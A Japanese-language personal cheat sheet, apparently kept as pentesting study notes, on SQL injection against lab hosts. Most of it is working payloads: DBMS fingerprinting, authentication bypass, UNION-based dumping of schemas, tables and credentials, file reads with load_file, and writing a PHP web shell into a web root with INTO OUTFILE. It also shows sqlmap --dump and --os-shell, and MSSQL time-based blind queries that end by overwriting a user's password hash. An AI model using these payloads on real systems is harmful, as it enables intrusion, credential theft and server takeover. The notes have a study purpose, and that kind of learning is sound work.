## ## DBの製品の特定
- MySQL(string concat and logical ops)
```sh
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)****
```
- PostgreSQL(only support string concat)
```sh
1' || pg_sleep(10)
```
- MSQL
```sh
1' WAITFOR DELAY '0:0:10'
```
- Oracle
```sh
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
```
- SQLite
```
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

- その他の列挙方法
```
["conv('a',16,2)=conv('a',16,2)" ,"MYSQL"],
["connection_id()=connection_id()" ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')" ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)" ,"MSSQL"],
["@@CONNECTIONS>0" ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS" ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY" ,"MSSQL"],
["USER_ID(1)=USER_ID(1)" ,"MSSQL"],
["ROWNUM=ROWNUM" ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')" ,"ORACLE"],
["LNNVL(0=123)" ,"ORACLE"],
["5::int=5" ,"POSTGRESQL"],
["5::integer=5" ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()" ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)" ,"POSTGRESQL"],
["current_database()=current_database()" ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()" ,"SQLITE"],
["last_insert_rowid()>1" ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()" ,"SQLITE"],
["val(cvar(1))=1" ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0" ,"MSACCESS"],
["cdbl(1)=cdbl(1)" ,"MSACCESS"],
["1337=1337", "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'", "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
![[Pasted image 20250524105650.png]]

### ### 参考サイト
[https://book.hacktricks.xyz/pentesting-web/sql-injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification)
[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---
## ## SQLiの列挙
- WordListを使用した列挙
```sh
ffuf -w /usr/share/SecLists/Fuzzing/SQLi/Generic-SQLi.txt -request-proto http -request request.txt -fs 1420

# Proxyを通す場合
ffuf -w /usr/share/SecLists/Fuzzing/SQLi/Generic-SQLi.txt -request-proto http -request request.txt -fs 1420 -replay-proxy http://127.0.0.1:8080/
```
- 他のWordLists
	- /opt/work/WordLists/wfuzz/wordlist/Injections/SQL.txt
	- /opt/work/WordLists/SecLists-master/Fuzzing/SQLi/Generic-SQLi.txt
	- /opt/work/WordLists/PayloadsAllTheThings/SQL\ Injection/Intruder/

---
## ## SQLi Authentication Bypass
基本的にはユーザが入力したユーザ名とパスワードをDBの値と比較するため、Where句とAND演算で構成されている。

- payload
```sh
# basic
select * from users where name = 'tom' or 1=1;

# 上記でうまくいかない場合
select * from users where name = 'tom' or 1=1 LIMIT 1;#
	プログラミング言語によって単一のレコードでないと失敗する場合がある。
	1=1の場合すべてのレコードが返されるため失敗する可能性がある。
```

---
## ## UnionSelect
- Union Selectの基本
	Union Selectは元のクエリに足してUnionSelectで追加した値を返す。

- Union Selectの要件は以下の二つ
	- 元のクエリと数の列を返す必要がある。
		元が`SELECT a,b FROM`だった場合、`SELECT a,b FROM * UNION SELECT c,b FROM Table2となる。
	- 各列のデータ型は、ここのクエリ間で互換性がある必要がある。

- UNION SELECTの列挙
1. ORDER BY句を使用してクエリの数を特定する。(エラーになるまで数字を増やしていく)
```sh
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- # <-ここでエラーが起きたらクエリは2つと判断

# 補足
# ORDER BY以外に以下の方法でもクエリの数がわかる。(これもエラーになるまで続ける。)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

2. Database名を列挙
```sh
-1' UniOn Select 1,2,Group_Concat(0x7c,schema_name,0x7c) FROM information_schema.schemata
```

3. table名の列挙
```sh
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]
```

4. Column名の列挙
```sh
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]

'union select 1,2,3,group_concat(username),group_concat(password),6 from UserDetails; #
```

### ### 参考文書
[https://portswigger.net/web-security/sql-injection/union-attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
[https://zenn.dev/riko/scraps/db85096c12145f](https://zenn.dev/riko/scraps/db85096c12145f)
[https://book.hacktricks.xyz/pentesting-web/sql-injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)

---
## ## 数値型の列挙と悪用
文字型と数値型の違いは'や"がいらないのが数値型。
- SQLiの有無確認
```sh
ffuf -w /opt/work/WordLists/sqli-logic.txt -request-proto http -request request.txt -fs 1420 -replay-proxy [http://127.0.0.1:8080/](http://127.0.0.1:8080/)
```


---
## ## SQLi RCE
- 基本概念
	SQLからファイルの読み取り、書き込みが可能である。
	SQLiを利用しPHPコードを含めてWebからアクセスしリバースシェルが取得可能。

- 攻撃要件
	- 権限

- ファイルの読み取り
	ファイルの読み取りにはload_file関数を使用する。
```sh
http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
```
- ファイル書き込み
	ファイルの書き込みはINTO OUTFILE関数を使用する。
```sh
http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

---
## ## SQLMAP
・識別および悪用をするために使用される。
- オプション
	--user-agent=SQLMAP
	--proxy http://127.0.0.1:8080
	--risk/--livel(df:1/1)
		- revel
		これはテストの範囲を指定するものである
		level1:指定したパラメータに対してテストを行う。
		level2:HTTPのクッキーヘッダに対してテストを行う。
		level3:HTTP User Agentとリファラーヘッダーに対してテストを行う。
		- risk
		リクエストの数を設定する
		![[Pasted image 20250524171539.png]]
### ### 使い方
テストするパラメータを[-p]で指定する。
```sh
# basic
sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
	# テストするパラメータを[-p]で指定する。

# database dump
sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump
	# [--dump]を使用する。

# WebShellのアップロード
sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --osshell
	--os-shellを使用する。

```

※参考資料
[https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)

---
## ## MSSQL(SQL Serverとも呼ばれる)
### ### タイムベース
```sh
'; IF (1=1) WAITFOR DELAY '0:0:10';-- - True
'; IF (1=2) WAITFOR DELAY '0:0:10';-- - Faluse
```

### ### テーブルの列挙(ユーザテーブルの場合はuser,users,usernameがよさげらしい)
```sh
'; IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';-- - MS SQL
```

### ### 列の列挙
上の例をそのままで行くと、usersテーブルに含まれる列名を特定する。
ログイン画面の場合はログインするために必要なユーザ名とパスワードを取得できるか確認する。
```sh
'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'username')=1) WAITFOR DELAY '0:0:10';--
	# like演算子で特定をするなら以下の様になる。

'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name like 'u%')=1) WAITFOR DELAY '0:0:10';--
↑これでできると思ったができなかった。なぜ？
'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name like 'username')=1) WAITFOR DELAY '0:0:10';--

```

### ### テーブルに行を追加するためにするべきこと。
```sh
1. テーブルに含まれるすべての列の列挙を行う必要がある。

'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' )>2) WAITFOR DELAY '0:0:10'; -- -
2つ以上の列があるかどうか。

'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' )>3) WAITFOR DELAY '0:0:10'; -- - 
3つの以上列があるかどうか。
↑ここで2つ目でタイムベースがうまくいかなければ列は3つあるといえる。

2. 以下の方法を使用してもうもう一つの判明してない列名を列挙する。
'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name like 'u%')=1) WAITFOR DELAY '0:0:10';--
```

### ### テーブル内の既存のユーザを特定
```sh
'; IF ((select count(username) from users where username like 'a%')=1) WAITFOR DELAY '0:0:10';-- -

'; IF ((select count(username) from users where username = 'butch')=1) WAITFOR DELAY '0:0:10';-- -これでユーザ名の列挙はできたと判断できる。
```

### ### 値の更新

```sh
'; update users set password_hash = '6183c9c42758fa0e16509b384e2c92c8a21263afa49e057609e3a7fb0e8e5ebb' where username = 'butch';-- -
	# 上記の様にパスワードを上書きする場合は以下の様なコマンドでエンコードする必要がある。

↓これでパスワードのハッシュを取得する。
# echo -n 'tacos123' | md5sum
# echo -n 'tacos123' | sha1sum
# echo -n 'tacos123' | sha256sum
```

---
